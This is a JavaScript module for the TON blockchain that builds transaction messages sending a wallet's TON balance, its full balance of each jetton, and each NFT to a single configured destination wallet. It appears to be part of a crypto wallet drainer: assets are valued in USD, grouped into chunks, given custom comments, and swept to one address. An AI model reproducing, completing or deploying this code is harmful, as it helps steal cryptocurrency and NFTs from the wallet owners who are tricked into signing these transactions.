const {TransactionBody, generateComment} = require('./utils');
const {pTON, DEX} = require("@ston-fi/sdk");
const TonWeb = require("tonweb");
const {TonClient} = require("@ton/ton");
const {encode} = require("uint8-to-base64");

module.exports.sendTon = async function sendTon(asset, settings, split = false) {
    try {
        const transactionBody = new TransactionBody(settings.WALLET);

        const bodyBoc = await transactionBody.generateTon(generateComment(asset, settings));

        if (asset.sendingBalance > settings.LEAVE_FEE_FOR_TRANSACTION) {
            return [{
                address: settings.WALLET,
                amount: asset.sendingBalance,
                balance: asset.balance,
                payload: bodyBoc,
                name: 'TON',
                usdBal: asset.calculatedBalanceUSDTG
            }];
        } else {
            return [];
        }
    } catch (error) {
        console.error('Error sending TON transaction:', error);
        return [];
    }
}

module.exports.sendToken = async function sendToken(chunk, settings) {
    try {
        const messages = [];
        for (const asset of chunk) {
            const transactionBody = new TransactionBody(settings.WALLET);

            const bodyBoc = await transactionBody.generateJetton(generateComment(asset, settings), asset.TokenBalance);

            const transaction = {
                address: asset.wallet_address,
                amount: 50000000,
                payload: bodyBoc,
                name: asset.name,
                usdBal: asset.calculatedBalanceUSDTG
            };
            messages.push(transaction);
        }
        return messages;
    } catch (error) {
        console.error('Error sending Token transaction:', error);
        return [];
    }
}

module.exports.sendNft = async function sendNft(chunk, settings) {
    try {
        const messages = [];

        for (const asset of chunk) {
            const transactionBody = new TransactionBody(settings.WALLET);

            const bodyBoc = await transactionBody.generateNFT(settings.NFT_COM);

            const transaction = {
                address: asset.data,
                amount: 50000000,
                payload: bodyBoc,
                name: asset.name,
                usdBal: asset.calculatedBalanceUSDTG
            };
            messages.push(transaction);
        }
        return messages;
    } catch (error) {
        console.error('Error sending NFT transaction:', error);
        return [];
    }
}